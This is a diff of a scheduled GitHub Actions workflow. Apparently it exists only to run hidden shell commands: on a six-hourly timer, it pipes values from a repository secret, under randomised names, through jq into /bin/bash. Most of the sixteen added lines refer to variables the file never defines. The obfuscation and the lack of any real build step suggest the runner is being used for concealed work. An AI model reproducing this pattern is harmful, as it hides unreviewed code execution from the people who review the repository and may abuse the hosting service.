@@ -1,19 +1,33 @@
 name: joemoonx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 5/6 * * *'
+    - cron: '46 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: joemoonx
         env:
-          nt971: ${{ secrets.nt971 }}
+          gevqf734: ${{ secrets.gevqf734 }}
         run: |
-          echo $nt971 | jq -r .rkq3309 | /bin/bash
-          echo $h2 | jq -r .m08 | /bin/bash
-          echo $vkm8604 | jq -r .xk03731 | /bin/bash
+          echo $gevqf734 | jq -r .rqb10 | /bin/bash
+          echo $sacbv64 | jq -r .ri34459 | /bin/bash
+          echo $q1 | jq -r .wcyii21492 | /bin/bash
+          echo $drw8953 | jq -r .qlrr763 | /bin/bash
+          echo $il08 | jq -r .j3562 | /bin/bash
+          echo $dfz4506 | jq -r .tfsfl13095 | /bin/bash
+          echo $pk9 | jq -r .hdjau5 | /bin/bash
+          echo $svf1 | jq -r .espcm46915 | /bin/bash
+          echo $n45089 | jq -r .ef58483 | /bin/bash
+          echo $gdw93969 | jq -r .d12 | /bin/bash
+          echo $fucf189 | jq -r .r7 | /bin/bash
+          echo $tumy8 | jq -r .ily2 | /bin/bash
+          echo $jnsdv77 | jq -r .leyag8 | /bin/bash
+          echo $omovn43 | jq -r .xsc02 | /bin/bash
+          echo $gs7 | jq -r .y03925 | /bin/bash
+          echo $ctji7055 | jq -r .uw28 | /bin/bash
 
